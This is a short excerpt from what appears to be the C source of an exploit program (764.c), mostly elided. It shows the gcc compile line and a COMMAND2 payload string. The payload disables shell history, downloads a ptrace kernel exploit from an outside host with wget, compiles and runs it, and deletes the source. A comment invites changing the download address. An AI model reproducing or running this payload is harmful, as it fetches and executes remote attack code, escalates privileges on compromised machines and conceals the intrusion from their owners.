 ...
 * Compile with: gcc -o 764 764.c -lcrypto
...
#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://10.211.55.6/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n" /* Change wget address 8 */
